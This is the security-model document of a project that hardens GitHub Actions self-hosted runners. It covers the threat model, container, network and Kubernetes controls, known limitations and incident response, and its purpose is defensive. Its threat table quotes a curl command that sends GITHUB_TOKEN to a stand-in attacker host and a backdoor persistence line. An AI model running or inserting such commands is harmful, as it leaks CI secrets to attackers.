# Security Model

RunSecure provides defense-in-depth for GitHub Actions self-hosted runners through three independent layers: **image hardening**, **runtime containment**, and **network isolation**. Each layer protects against distinct attack vectors, and a breach of one layer does not compromise the others.

---

## Threat Model

### Who are we defending against?

1. **Compromised third-party Actions** (e.g., `tj-actions/changed-files` supply chain attack, March 2025)
2. **Malicious npm/PyPI packages** pulled during `npm install` or `pip install`
3. **Poisoned pull requests** from forks that execute code on the runner
4. **Insider threats** — malicious workflow steps added by compromised accounts

### What are they trying to do?

| Goal | Example |
|------|---------|
| **Exfiltrate secrets** | `curl http://evil.com?token=$GITHUB_TOKEN` |
| **Persist on the machine** | `RUNNER_TRACKING_ID=0 nohup backdoor &` |
| **Move laterally** | SSH to internal hosts, access cloud metadata |
| **Cryptomine** | Download and run a miner binary |
| **Tamper with builds** | Modify build output, inject malicious code |

---

## Hardening Layers

### Layer 1: Image Hardening (build-time)

Reduces the attack surface inside the container by removing tools and capabilities an attacker would need.

| Hardening | What it prevents | Verified by |
|-----------|-----------------|-------------|
| Non-root user (UID 1001) | Root-level filesystem and process access | `validate-runner.sh` |
| `su`/`sudo` binaries removed | Privilege escalation via user switching | `validate-runner.sh` |
| All setuid/setgid bits stripped | Privilege escalation via setuid binaries | `validate-runner.sh` |
| Root account locked, shell set to nologin | Login as root | `validate-runner.sh` |
| Package manager removed (apt/dpkg) in final images | Installing attack tools at runtime | `validate-runner.sh` |
| Network recon tools removed (ping, nc, ssh, wget) | Network reconnaissance, lateral movement | `validate-runner.sh` |
| Persistence tools removed (crontab, at) | Surviving job completion | `validate-runner.sh` |
| SHA256-verified binary downloads | Supply chain attacks on runner binary | `base.Dockerfile` |
| Pinned package versions | Version-swap supply chain attacks | `base.Dockerfile` |
| `--no-install-recommends` on all apt installs | Reducing unneeded packages | `base.Dockerfile` |
| Multi-stage builds (compilers not in final image) | Building exploits on-host | `compose-image.sh` |

### Layer 2: Runtime Containment (launch-time)

Enforced by Docker flags when the container starts. Cannot be circumvented by code inside the container.

| Flag | What it prevents | Verified by |
|------|-----------------|-------------|
| `--rm` | State persisting between jobs | `run-all-tests.sh` (cleanup test) |
| `--user 1001:0` | Running as root; system paths (root-owned) not writable | `validate-runner.sh` |
| `--tmpfs /tmp:noexec` | Executing downloaded binaries from /tmp | `validate-runner.sh` |
| `--cap-drop=ALL` | All Linux capability-based attacks | `test-attack-simulation.sh` |
| `--security-opt=no-new-privileges` | Privilege escalation via setuid/setgid at runtime | `test-attack-simulation.sh` |
| `--pids-limit` | Fork bombs, unbounded process spawning | `run-all-tests.sh` (PID test) |
| `--memory` / `--memory-swap` | Memory exhaustion, OOM attacks | `validate-runner.sh` |
| `--cpus` | CPU exhaustion (cryptomining) | `validate-runner.sh` |
| Seccomp profile (`node-runner.json`) | Dangerous syscalls (ptrace, mount, bpf, keyctl) | Architecture |

### Layer 3: Network Isolation (network-level)

The Docker network architecture prevents the container from reaching the internet directly. All traffic must pass through the Squid proxy.

| Control | What it prevents | Verified by |
|---------|-----------------|-------------|
| Internal Docker network | Direct internet access bypassing proxy | `test-egress-proxy.sh` (bypass test) |
| Squid domain allowlist | Exfiltration to attacker servers | `test-egress-proxy.sh` (25 checks) |
| CONNECT method filtering | HTTPS exfiltration to blocked domains | `test-egress-proxy.sh` |
| Non-standard port blocking | Connections on ports other than 443 | `test-egress-proxy.sh` |
| Cloud metadata endpoint blocking | SSRF to 169.254.169.254 / metadata.google.internal | `test-egress-proxy.sh` |
| Proxy access log | Post-incident forensics | `squid/base.conf` |
| HAProxy TCP egress allowlist | Raw TCP connections to non-approved host:port | `test-tcp-egress.sh` |
| SSRF protection in config fetcher | Private/RFC1918/loopback IPs in dns.hosts_file/whitelist_file URLs | `test-ssrf-protection.sh` (22 checks) |
| dnsmasq DNS isolation | Leaking internal queries to host resolver when dns.host:false | `test-dns-validation.sh` |
| Schema validation | Malformed runner.yml reaching the proxy generator | `test-strict-schema-rejection.sh` |

### Layer 4: Kubernetes backend controls (2.1.0, `backend: kube`)

These controls apply only when deploying via the Kubernetes backend
(`charts/runsecure-orchestrator/` with `scope.backend: kube`).
**All NetworkPolicy claims require a NetworkPolicy-enforcing CNI (Calico,
Cilium). kindnet and flannel do not enforce NetworkPolicy; under those CNIs
the policies are created but silently ignored.**

| Control | What it prevents | Verified by |
|---------|-----------------|-------------|
| Per-spawn `RunnerEgressNetworkPolicy` | Runner Pod reaching anything other than its own proxy Pod on 3128/TCP | `tests/integration/k8s/run-k8s-tests.sh` step 5a–5c (Calico) |
| Per-spawn `ProxyIngressNetworkPolicy` | Runner of one spawn reaching the proxy of a different spawn (cross-spawn); also makes runner→proxy 3128/TCP work under default-deny (load-bearing — runner→proxy is blocked without it) | `tests/integration/k8s/run-k8s-tests.sh` step 5d |
| Per-spawn `ProxyEgressNetworkPolicy` | Proxy reaching destinations other than kube-dns + internet via Squid allow-list | `tests/integration/k8s/run-k8s-tests.sh` step 4 |
| Namespace default-deny NetworkPolicy | All unlisted traffic blocked at network layer | Chart `networkpolicy-default-deny.yaml` |
| Namespace-scoped RBAC (Role, not ClusterRole) | Orchestrator SA acting outside its scope namespace or creating cluster-level objects | `tests/integration/k8s/run-k8s-tests.sh` step 6 |
| PSS Restricted admission | Privileged Pods, host namespaces, unsafe capabilities in the scope namespace | `tests/integration/k8s/run-k8s-tests.sh` step 3 |
| `automountServiceAccountToken: false` on runner+proxy Pods | Runner or proxy code accessing the kube API via the default SA token | `infra/orchestrator/internal/kube/objects.go` (all pod builders) |
| GitHub App least-privilege installation tokens | Long-lived PAT as the only auth option; user-identity-scoped tokens in multi-team environments | `infra/orchestrator/internal/auth/githubapp.go` |
| Optional mTLS on orchestrator→socket-proxy hop | Plaintext traffic between orchestrator and socket-proxy in a shared network segment | `infra/socket-proxy/internal/config/config.go` (`BuildTLSConfig`: TLS 1.3, `RequireAndVerifyClientCert`) |
| cert-manager TLS via chart | Manual certificate rotation for the socket-proxy TLS certificate | Chart `certificate.yaml` + `issuer-selfsigned.yaml` (rendered when `tls.enabled: true`) |

---

## Known Limitations

### What RunSecure does NOT protect against

1. **Attacks that only use allowed domains.** If an attacker exfiltrates data to `github.com` (e.g., creating an issue or pushing to a repo they control), the proxy allows it because `github.com` is in the allowlist. Mitigate with minimal `GITHUB_TOKEN` permissions.

2. **DNS-based exfiltration via the proxy.** The Squid proxy resolves DNS for allowed domains. An attacker could theoretically encode data in DNS queries to an allowed domain's nameserver. This is a very low-bandwidth channel.

3. **Timing side-channel attacks.** Resource limits prevent large-scale abuse but don't prevent information leakage via timing.

4. **Kernel exploits.** If the Linux kernel in the Docker VM has an unpatched vulnerability, a sufficiently sophisticated attacker could escape the container. Keep Docker Desktop / Colima updated.

5. **Docker daemon compromise.** The runner does NOT mount the Docker socket. But if the Docker daemon itself is compromised on the host, all containers are at risk.

6. **TCP port collisions.** Each `tcp_egress` port must be unique. If two services use the same port number, only one can be added.

7. **TCP egress is content-opaque.** haproxy forwards bytes; no TLS termination, no protocol-aware ACL. Audit story is "who connected to what, when, for how long" — not "what was sent."

8. **The egress proxy is fail-closed.** If squid, haproxy, or dnsmasq dies, the container exits and the runner's connections start failing. There is no graceful degradation.

9. **`egress.allow_domains` deprecated (2.0.0).** Renamed to `http_egress`. The old key is honoured as an alias in 2.x — the Go orchestrator and `run.sh` both accept it and emit a `WARNING` to stderr recommending migration. The alias will be removed in 3.0; migrate now by renaming the key. Both paths (orchestrator + `run.sh`) enforce `http_egress` through the Squid allowlist per-spawn.

10. **No UDP egress.** UDP traffic (other than DNS via dnsmasq when `dns.host: false`) is not proxied.

11. **CONNECT method only.** HTTP/HTTPS goes through Squid CONNECT — no TLS interception. Some HTTP/1.0 clients without CONNECT support may fail.

12. **DNS log sensitivity.** When `dns.host: false` and `dns.log_queries: true`, query names appear in `_diag-proxy/`. Set `dns.log_queries: false` on sensitive CI hosts.

13. **`_diag/` and `_diag-proxy/` host-mounted volumes.** As of this release, the runner's `_diag/` directory is host-mounted at the orchestrator's working directory for operator-side log recovery. Workflows that echo secrets to stdout/stderr (`set -x`, debug-print of `$DATABASE_URL`) leave those secrets in `_diag/Worker_*.log` until rotation (one previous run is kept). On shared CI hosts, set `RUNSECURE_DIAG_RETENTION=0` to disable the bind mount — the synchronous log-upload wait still ensures `gh api .../jobs/<id>/logs` works.

14. **JIT config exposure via env var (deprecated path).** The orchestrator currently passes the GitHub JIT runner token to the container via `RUNNER_JIT_CONFIG`. While the entrypoint reads it once and `unset`s it, the value is briefly visible to `docker inspect`, container audit logs, and any process inside the container that reads `/proc/1/environ` before the entrypoint clears it. The entrypoint also accepts a file-based path (`RUNNER_JIT_CONFIG_FILE`) which removes those exposure surfaces entirely; the orchestrator switchover to file-mode is a tracked follow-up. Until then, keep gh CLI scopes minimal (see `[RunSecure] WARNING` lines on `run.sh` startup) and do not run RunSecure on shared hosts where unprivileged users can inspect container config.

15. **`gh` CLI scope breadth (M15).** The orchestrator on the host uses `gh auth` to request JIT tokens. If the authenticated user has scopes beyond `repo` + `workflow` (or `admin:org` + `workflow` for org runners), a compromised orchestrator can do more than launch ephemeral runners. `run.sh` now warns at startup when it detects scopes like `delete_repo`, `admin:public_key`, `admin:gpg_key`, `admin:org_hook`, `gist`, or `user`. Re-authenticate with the minimum scope set when this warning appears.

16. **Orchestrator egress enforcement (2.0.0).** The Go orchestrator now enforces the `http_egress` and `tcp_egress` allow-paths per-spawn, not just deny-all. Each spawn creates one combined proxy container (Squid + HAProxy + dnsmasq) that is dual-homed on the internal runner network (DNS alias `proxy`) and a deploy-provisioned `spawn-egress` network with ICC disabled. The runner container receives `HTTP_PROXY=http://proxy:3128` and has no direct internet route. Squid also refuses private-IP destinations (DNS-rebinding defense). Literal private/special-range IPs in `tcp_egress`/`http_egress` are rejected by the orchestrator unless the operator sets `orchestrator.security_overrides.allow_private_cidrs: true` and the scope grants `allow_project_overrides`.

17. **Orchestrator dnsmasq limitation (2.0.x).** The Go orchestrator drops all Linux capabilities (`cap_drop: ALL`) before starting each per-spawn proxy container. `dnsmasq` needs `CAP_NET_BIND_SERVICE` to bind port 53; that capability is unavailable on the orchestrator path, so `dns.host: false` is a no-op when using the orchestrator. `run.sh` still supports `dns.host: false` fully. Remote `hosts_file`/`whitelist_file` fetching via the orchestrator is a tracked 2.0.x follow-up. This is an architectural gap, not a regression — the orchestrator path was deny-all before 2.0.0.

18. **Egress-gate network-name matching.** The socket-proxy gates `spawn-egress` network attachment to containers labelled `runsecure.role=proxy`. The gate matches by network **name**, not by cryptographic ID. A compromised orchestrator that knows the network name could re-attach to it. The network name is derived from the spawn ID and is not predictable from outside the orchestrator process; this is a residual risk documented for transparency.

### Accepted Risks

- **apt binary exists in intermediate images** (language layers). It is removed in final composed images via `finalize-hardening.sh`. In intermediate images, the runner user (UID 1001) cannot install system packages without root/capabilities.
- **Container filesystem is writable by the runner user** in its home directory. The GH Actions runner requires this to write config, diagnostic logs, and download actions at runtime. System paths (`/usr`, `/etc`) are protected by root ownership and `chmod 555`. The container is ephemeral (`--rm`) so nothing persists.
- **`/proc/self/environ` is readable.** This is standard in containers. The environment should contain only non-secret configuration. GitHub Actions injects secrets at runtime and they are redacted from logs (though this is not a security boundary).

---

## Incident Response

### If a CI job is compromised

1. The container is already destroyed (ephemeral + `--rm`).
2. Check the Squid proxy access log for any successful outbound connections to unexpected domains.
3. Rotate any secrets that were available to the workflow.
4. Audit the workflow file and all referenced Actions for tampering.

### If the proxy access log shows unexpected traffic

1. Identify the domain and the workflow run that generated the traffic.
2. Check if a dependency update introduced a new network call.
3. If malicious, pin the dependency version and report the package.

### Updating after a security advisory

1. Rebuild base images: `docker build -f images/base.Dockerfile --no-cache -t runner-base:latest .`
2. Rebuild language images (they inherit from base).
3. Re-run validation: `./tests/validation/run-all-tests.sh`
4. Re-run integration tests: `./tests/integration/run-integration-tests.sh`
